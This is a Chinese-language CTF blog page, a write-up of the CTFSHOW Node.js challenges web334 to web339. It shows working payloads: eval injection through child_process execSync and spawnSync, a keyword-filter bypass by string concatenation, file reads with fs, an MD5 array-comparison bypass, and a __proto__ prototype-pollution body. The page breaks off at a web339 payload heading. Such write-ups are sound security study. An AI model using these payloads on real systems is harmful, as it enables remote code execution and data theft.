@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>CTFSHOW | nodejs题解 web334 - web344 - WayneJH Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="WayneJH Blog"><meta name="msapplication-TileImage" content="https://oss.waynejoons.icu/picphoto/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="WayneJH Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights"><meta property="og:type" content="blog"><meta property="og:title" content="CTFSHOW | nodejs题解 web334 - web344"><meta property="og:url" content="https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/"><meta property="og:site_name" content="WayneJH Blog"><meta property="og:description" content="Welcome to WayneJH Blog - CTF writeups and cybersecurity insights"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://waynejoon.github.io/img/waynejoon.jpg"><meta property="article:published_time" content="2025-08-14T02:45:39.000Z"><meta property="article:modified_time" content="2025-08-14T02:46:17.684Z"><meta property="article:author" content="WayneJoon.H"><meta property="article:tag" content="CTFSHOW"><meta property="article:tag" content="CTF练习"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://waynejoon.github.io/img/waynejoon.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/"},"headline":"CTFSHOW | nodejs题解 web334 - web344","image":["https://oss.waynejoons.icu/picphoto/20250814101654895.png","https://oss.waynejoons.icu/picphoto/20250811165358821.png","https://oss.waynejoons.icu/picphoto/20250811165648974.png","https://oss.waynejoons.icu/picphoto/20250811170126699.png","https://oss.waynejoons.icu/picphoto/20250811221417656.png","https://oss.waynejoons.icu/picphoto/20250811224336094.png","https://oss.waynejoons.icu/picphoto/20250811223714875.png","https://oss.waynejoons.icu/picphoto/20250811223800345.png","https://oss.waynejoons.icu/picphoto/20250811225627185.png","https://oss.waynejoons.icu/picphoto/20250811231135598.png","https://oss.waynejoons.icu/picphoto/20250811231547821.png","https://oss.waynejoons.icu/picphoto/20250811234111861.png","https://oss.waynejoons.icu/picphoto/20250811234159579.png","https://oss.waynejoons.icu/picphoto/20250811234326867.png","https://oss.waynejoons.icu/picphoto/20250811234703548.png","https://oss.waynejoons.icu/picphoto/20250812172007286.png","https://oss.waynejoons.icu/picphoto/20250812174110379.png","https://oss.waynejoons.icu/picphoto/20250812185834888.png","https://oss.waynejoons.icu/picphoto/20250812194405714.png","https://oss.waynejoons.icu/picphoto/20250813180749964.png","https://oss.waynejoons.icu/picphoto/20250812192813708.png","https://oss.waynejoons.icu/picphoto/20250812192921525.png","https://oss.waynejoons.icu/picphoto/20250812193909573.png","https://oss.waynejoons.icu/picphoto/20250813110919891.png","https://oss.waynejoons.icu/picphoto/20250813111110126.png","https://oss.waynejoons.icu/picphoto/20250813111300263.png","https://oss.waynejoons.icu/picphoto/20250813114617857.png","https://oss.waynejoons.icu/picphoto/20250813114957019.png","https://oss.waynejoons.icu/picphoto/20250813114917719.png","https://oss.waynejoons.icu/picphoto/20250813115850012.png","https://oss.waynejoons.icu/picphoto/20250813201348782.png","https://oss.waynejoons.icu/picphoto/20250813201624962.png","https://oss.waynejoons.icu/picphoto/20250813202719540.png","https://oss.waynejoons.icu/picphoto/20250813203743959.png","https://oss.waynejoons.icu/picphoto/20250813203902301.png","https://oss.waynejoons.icu/picphoto/20250813204211882.png","https://oss.waynejoons.icu/picphoto/20250813204457722.png","https://oss.waynejoons.icu/picphoto/20250813204802599.png","https://oss.waynejoons.icu/picphoto/20250813204914963.png","https://oss.waynejoons.icu/picphoto/20250813205642028.png","https://oss.waynejoons.icu/picphoto/20250813210054705.png","https://oss.waynejoons.icu/picphoto/20250813211513738.png","https://oss.waynejoons.icu/picphoto/20250813223720736.png","https://oss.waynejoons.icu/picphoto/20250813224859620.png","https://oss.waynejoons.icu/picphoto/20250813232421761.png","https://oss.waynejoons.icu/picphoto/20250813225514864.png","https://oss.waynejoons.icu/picphoto/20250813225743400.png","https://oss.waynejoons.icu/picphoto/20250813232321669.png","https://oss.waynejoons.icu/picphoto/20250813234149899.png","https://oss.waynejoons.icu/picphoto/20250813234333039.png","https://oss.waynejoons.icu/picphoto/20250813235152689.png","https://oss.waynejoons.icu/picphoto/20250813235308095.png","https://oss.waynejoons.icu/picphoto/20250813235855849.png","https://oss.waynejoons.icu/picphoto/20250814002612463.png"],"datePublished":"2025-08-14T02:45:39.000Z","dateModified":"2025-08-14T02:46:17.684Z","author":{"@type":"Person","name":"WayneJoon.H"},"publisher":{"@type":"Organization","name":"WayneJH Blog","logo":{"@type":"ImageObject","url":{"text":"WayneJH"}}},"description":"CTFSHOW nodejs专题详细题解"}</script><link rel="canonical" href="https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/"><link rel="icon" href="https://oss.waynejoons.icu/picphoto/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="WayneJH Blog" type="application/atom+xml">
+</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">WayneJH</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/links">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-08-14T02:45:39.000Z" title="2025/8/14 10:45:39">2025-08-14</time>发表</span><span class="level-item"><a class="link-muted" href="/categories/CTFSHOW/">CTFSHOW</a></span><span class="level-item">29 分钟读完 (大约4338个字)</span><span class="level-item" id="busuanzi_container_page_pv" style="display:none"><span id="busuanzi_value_page_pv">--</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW | nodejs题解 web334 - web344</h1><div class="content"><h2 id="什么是nodejs"><a href="#什么是nodejs" class="headerlink" title="什么是nodejs"></a>什么是nodejs</h2><p><strong>Node.js</strong> 是一个基于 Chrome V8 引擎的开源、跨平台的 <strong>JavaScript 运行环境</strong>，主要用于在服务端运行JavaScript代码。以前JavaScript大多只能在浏览器中运行，有了 Node.js，开发者可以用 JavaScript 开发后端服务端应用，比如Web服务器、命令行工具等</p>
+<p>核心特点如下：</p>
+<ul>
+<li>采用 <strong>事件驱动</strong>、<strong>非阻塞式I&#x2F;O</strong>模型，使其高效、轻量，特别适合处理高并发、I&#x2F;O密集的网络应用</li>
+<li>利用 <strong>V8 引擎</strong>，JavaScript 代码执行速度快、性能高</li>
+<li>拥有全球最大的开源包管理生态系统—— <strong>npm</strong>，可便捷地安装和管理各种第三方模块和工具包</li>
+<li>让前端开发者可以用同一种语言开发前后端，提高开发效率与协同</li>
+</ul>
+<p>Node.js 不是一门新语言，也不是JavaScript的框架，更不是Web服务器；它就是一个能在服务器端运行JavaScript的平台，类似于Java的JVM在服务器上运行Java程序</p>
+<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载题目附件进行分析，一共就两个文件</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250814101654895.png"></p>
+<p><code>user.js</code>里面写了用户账号密码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811165358821.png"></p>
+<p>然后<code>login.js</code>是关于登录的一些逻辑校验，其中我们需要重点关注的是<code>findUser</code>变量这里</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811165648974.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br></pre></td></tr></table></figure>
+
+<p>要求名字不为CTFSHOW，但是后面有个<code>toUpperCase()</code>函数，也就是输入的用户名会变大写，那只要输入小写的<code>ctfshow</code>，经过<code>toUpperCase()</code>变大写之后就通过验证了</p>
+<p>打开题目环境，登录框输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：ctfshow</span><br><span class="line">密码：123456</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811170126699.png"></p>
+<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>打开题目环境，查看网页源代码，可以看到有注释提示，可以拼接进网站访问</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811221417656.png"></p>
+<p>应该是<code>eval()</code>函数，可以用<code>child_process</code>来调用API执行系统命令</p>
+<p><strong>什么是child_process</strong></p>
+<p><strong>child_process</strong> 是 Node.js 的一个核心模块，用于在应用程序中创建和管理<strong>子进程</strong>，让 JavaScript 能够在服务器端执行外部命令、脚本或者进行多进程并发运算</p>
+<p><strong>常用API</strong></p>
+<ul>
+<li><code>spawn()</code>：创建新进程，流方式处理数据，适合实时数据处理</li>
+<li><code>exec()</code>：执行命令或脚本，回调方式返回所有输出，适合一次性任务</li>
+<li><code>execFile()</code>：直接执行文件，减少命令注入风险</li>
+<li><code>fork()</code>：专门用于启动新的 Node.js 进程，并与主进程实现 IPC（进程间通信）</li>
+<li><code>execSync()</code>：同步执行命令，阻塞直到完成，返回结果，简洁直观</li>
+<li><code>spawnSync()</code>：同步版本的 spawn，阻塞等待子进程完成，返回详细进程信息</li>
+</ul>
+<p>这题需要我们用<code>require</code>包含<code>child_process</code>模块来调用API执行命令</p>
+<p>但是如果我们直接执行<code>exec()</code>，会返回<code>[object Object]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).exec(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811224336094.png"></p>
+<p>这是因为<code>exec()</code>是异步执行，通过回调函数传递输出与错误，直接调用的话会返回一个 <code>ChildProcess</code> 对象，正确的方法应像下面这样</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout); <span class="comment">// 这里才是命令输出</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>而<code>execSync()</code>则是同步执行，直接返回命令执行后的输出内容（Buffer 或 String），可以直接打印数据</p>
+<p>所以我们用<code>execSync()</code>来执行命令</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811223714875.png"></p>
+<p>成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811223800345.png"></p>
+<p>当然调用<code>spawnSync()</code>也可以，不过直接打印的话它会返回一个<strong>包含多个属性的对象</strong>，需要用stdout输出Buffer，然后通过<code>toString()</code>转换为字符串，调用格式为<code>spawnSync(command, args)</code>。如果你把命令和参数写在同一个字符串里（如 <code>&#39;cat fl00g.txt&#39;</code>），<code>spawnSync</code> 会当作单一命令去执行，导致找不到该命令或执行出错，因此需要拆开</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811225627185.png"></p>
+<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>这题跟上题差不多，但是调用<code>execSync()</code>不行了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811231135598.png"></p>
+<p>这里介绍两个变量，<code>__filename</code>和<code>__dirname</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename：获取当前模块文件的完整绝对路径文件名</span><br><span class="line">__dirname：获取当前文件所在目录的完整目录名</span><br></pre></td></tr></table></figure>
+
+<p>直接在网站拼接命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=__filename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811231547821.png"></p>
+<p>可以看到网站显示了当前文件的绝对路径<code>/app/routes/index.js</code></p>
+<p>我们用fs模块的<code>readFileSync()</code>来读取文件，fs模块（File System 模块）是专门用于进行<strong>文件系统相关操作的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p>直接爆出源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">typeof</span>(evalstring) == <span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到过滤了包含 <code>exec</code> 或 <code>load</code> 的字符串，有很多种方法可以做这题</p>
+<p><strong>1. 字符串拼接绕过</strong></p>
+<p>把<code>execSync</code>拆成 <code>exe</code> + <code>cSync</code>，然后拼接字符串，%2B是加号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811234111861.png"></p>
+<p>然后读取flag即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;cat fl001g.txt&#x27;).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811234159579.png"></p>
+<p><strong>2. spawnSync() 命令执行</strong></p>
+<p>跟web335一样，换成<code>spawnSync()</code>即可绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811234326867.png"></p>
+<p><strong>3. readFileSync() 文件读取</strong></p>
+<p>先用<code>readdirSync()</code>读取目录文件，然后用<code>readFileSync()</code>读取文件内容即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250811234703548.png"></p>
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><p>题目给出了源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+
+<p>其中重点需要关注的是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>要求传入的<code>a</code>和<code>b</code>长度相同，内容不相同且要求 <code>a</code> 加上 <code>flag</code> 后的 MD5 哈希值，必须等于 <code>b</code> 加上 <code>flag</code> 后的 MD5 哈希值</p>
+<p>这里我们用<strong>数组绕过</strong></p>
+<p>这里涉及到一个概念，如果传入<code>a[]=1&amp;b[]=2</code>，返回的是数组<code>[&#39;1&#39;]</code>和<code>[&#39;2&#39;]</code>，在md5校验那里就相当于需要<code>[&#39;1&#39;]+flag===[&#39;2&#39;]+flag</code>，而由于JavaScript **隐式类型转换 + 字符串拼接 **的原因，<code>[&#39;1&#39;]+flag</code>会变成<code>1flag</code>，举个例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1&quot;</span> + [<span class="number">2</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="comment">// 步骤： [2,2] -&gt; 调用 toString() =&gt; &quot;2,2&quot;</span></span><br><span class="line"><span class="comment">// 字符串拼接 =&gt; &quot;1&quot; + &quot;2,2&quot; =&gt; &quot;12,2&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此只要我们输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b=1</span><br></pre></td></tr></table></figure>
+
+<p>a解析为数组<code>[&#39;1&#39;]</code>，b解析为字符串<code>&#39;1&#39;</code>，经过转换之后，得到的结果都是<code>1flag</code>，因此它们的md5相同，成功通过验证</p>
+<p>也是顺利拿到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812172007286.png"></p>
+<p>还有一种方法，就是往数组里面传入<strong>非数字索引</strong>，例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果是<code>&#123; x: &#39;1&#39;&#125;</code>和<code>&#123; x: &#39;2&#39;&#125;</code>，变成JS里面的对象了，传入对象之后，经过<code>console.log</code>后返回的都是<code>[object Object]</code>，此时进行变量拼接得到的结果为<code>[object Object]flag</code>，再进行md5加密之后也是相同的</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812174110379.png"></p>
+<p>如果传入<code>a[x]=1&amp;b[x]=1</code>也是可以的，因为两个对象的比较并不是比较属性，而是通过引用内存里的位置来比较的，所以 <code>a !== b</code> 的条件依然成立</p>
+<h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>下载源码分析，先看<code>app.js</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812185834888.png"></p>
+<p>可以看到包含了<code>index.js</code>和<code>login.js</code>，<code>index.js</code>里面没什么东西，主要看<code>login.js</code>文件</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812194405714.png"></p>
+<p>想要拿到flag就必须要<strong>secert</strong>的<code>ctfshow</code>属性值为<code>36dboy</code>，且secert变量值为空。向下分析，可以看到body的内容被copy到了user里面，查看copy的定义，可以发现copy竟然跟merge方法一模一样，因此这题可以用<strong>原型链污染</strong>来做，传入属性<code>__proto__</code>来污染Object原型</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813180749964.png"></p>
+<p>做原型链污染之前，建议先看一遍文章了解一下：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">深入理解 JavaScript Prototype 污染攻击</a></p>
+<p>打开题目环境，随便输入账号密码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812192813708.png"></p>
+<p>可以看到body的值传到了user里面，我们修改键值对为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样做可以污染Object的原型，从而使得所有对象都继承了该属性，于是进行验证的时候，满足<code>secert.ctfshow===&#39;36dboy&#39;</code>，也就拿到了flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812192921525.png"></p>
+<p>原型链被污染后，部分代码里其他依赖对象原型正常结构的地方会出错，依赖于纯净、标准原型链的对象操作（比如 for…in、Object.keys()、属性枚举和判断、库函数内部操作等）可能会出错或出现行为异常，导致POST访问<code>/login</code>时报 500 错误</p>
+<p>因此这题只有一次污染机会，如果写错了值的话就只能重新启动环境做了，因为POST访问<code>/login</code>只返回500了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250812193909573.png"></p>
+<h3 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h3><p>打开源码分析，在<code>app.js</code>可以看到指向三个路由</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813110919891.png"></p>
+<p>相比上一题，这题<code>login.js</code>的校验条件变了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813111110126.png"></p>
+<p>要求<code>secert.ctfshow===flag</code>，但我们并不知道flag的值，因此只能另辟蹊径</p>
+<p>继续分析<code>api.js</code>，发现可以通过<strong>污染query</strong>来控制Function执行RCE操作</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250813111300263.png"></p>
+<p>由于 Node.js 默认不会自动暴露 <code>require</code> 给 <code>Function</code> 创建的函数，因此这里用<code>process.mainModule.constructor._load</code> 替代 <code>require</code>来包含<code>child_process</code></p>
+<p>payload：</p>
